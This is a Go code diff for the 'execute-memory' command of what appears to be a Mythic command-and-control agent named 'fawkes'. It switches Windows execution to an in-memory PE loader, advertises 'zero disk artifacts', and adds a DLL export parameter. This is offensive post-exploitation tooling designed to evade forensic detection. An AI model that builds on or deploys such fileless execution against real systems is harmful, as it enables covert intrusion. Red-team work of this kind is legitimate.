@@ -12,7 +12,7 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "execute-memory",
-		Description:         "Execute a native binary from memory. Linux: memfd_create (no disk write). macOS/Windows: temp file with immediate cleanup (minimal disk footprint).",
+		Description:         "Execute a native binary from memory. Auto-detects PE type: .NET→CLR hosting, native→in-memory PE mapping, Linux→memfd_create. Zero disk artifacts on Windows/Linux.",
 		HelpString:          "execute-memory -arguments 'arg1 arg2' -timeout 60",
 		Version:             1,
 		Author:              "@galoryber",
@@ -116,6 +116,31 @@ func init() {
 					},
 				},
 			},
+			{
+				Name:             "export_name",
+				CLIName:          "export_name",
+				ModalDisplayName: "DLL Export Function",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Windows DLLs: export function to call after DllMain (e.g., Go, Run, Execute). Leave empty for DllMain only.",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     4,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "New File",
+						UIModalPosition:     4,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "CLI",
+						UIModalPosition:     4,
+					},
+				},
+			},
 		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
@@ -134,6 +159,7 @@ func init() {
 
 			arguments, _ := taskData.Args.GetStringArg("arguments")
 			timeout, _ := taskData.Args.GetNumberArg("timeout")
+			exportName, _ := taskData.Args.GetStringArg("export_name")
 			if timeout <= 0 {
 				timeout = 60
 			}
@@ -150,7 +176,7 @@ func init() {
 				methodLabel = "tmpfile + codesign + execve"
 			} else if os == "Windows" {
 				binaryLabel = "PE"
-				methodLabel = "tmpfile + CreateProcess"
+				methodLabel = "in-memory PE loader"
 			}
 
 			// Check for direct base64 binary first (CLI/API usage)
@@ -163,15 +189,19 @@ func init() {
 					return response
 				}
 				params := map[string]interface{}{
-					"binary_b64": b64,
-					"arguments":  arguments,
-					"timeout":    timeout,
+					"binary_b64":  b64,
+					"arguments":   arguments,
+					"timeout":     timeout,
+					"export_name": exportName,
 				}
 				paramsJSON, _ := json.Marshal(params)
 				taskData.Args.SetManualArgs(string(paramsJSON))
 				displayParams := fmt.Sprintf("%s: base64 (%d bytes)", binaryLabel, len(decoded))
 				if arguments != "" {
 					displayParams += fmt.Sprintf(", args: %s", arguments)
+				}
+				if exportName != "" {
+					displayParams += fmt.Sprintf(", export: %s", exportName)
 				}
 				response.DisplayParams = &displayParams
 				createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("%s (%d bytes)", methodLabel, len(decoded)))
@@ -235,13 +265,17 @@ func init() {
 			if arguments != "" {
 				displayParams += fmt.Sprintf(", args: %s", arguments)
 			}
+			if exportName != "" {
+				displayParams += fmt.Sprintf(", export: %s", exportName)
+			}
 			response.DisplayParams = &displayParams
 			createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("%s: %s (%d bytes)", methodLabel, filename, len(fileContents)))
 
 			params := map[string]interface{}{
-				"binary_b64": base64.StdEncoding.EncodeToString(fileContents),
-				"arguments":  arguments,
-				"timeout":    timeout,
+				"binary_b64":  base64.StdEncoding.EncodeToString(fileContents),
+				"arguments":   arguments,
+				"timeout":     timeout,
+				"export_name": exportName,
 			}
 			paramsJSON, err := json.Marshal(params)
 			if err != nil {
